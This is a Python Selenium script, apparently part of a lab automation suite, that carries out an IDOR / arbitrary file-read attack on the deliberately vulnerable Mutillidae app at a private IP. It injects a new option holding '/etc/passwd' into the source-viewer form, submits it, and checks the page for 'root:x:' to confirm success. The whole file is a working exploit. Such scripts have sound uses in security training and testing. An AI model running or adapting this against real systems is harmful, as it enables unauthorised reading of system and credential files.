from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser
from selenium.webdriver.support.ui import Select


def idor(
    ip="192.168.255.133",
    sleep_time=0,
    payload="/etc/passwd",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=source-viewer.php")
        select_element = browser.find_element(By.ID, "id_file_select")
        browser.execute_script(
            """
            var select = arguments[0];
            var option = document.createElement('option');
            option.value = arguments[1];
            option.text = arguments[1];
            select.add(option);
        """,
            select_element,
            payload,
        )
        Select(select_element).select_by_value(payload)
        browser.find_element(By.NAME, "source-file-viewer-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(
                By.XPATH, "//pre/code/span[contains(text(), 'root:x:')]"
            )
            print(f'Output of the payload: {element.get_attribute("innerHTML")}')
            print("IDOR attack succeeded")
            return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()
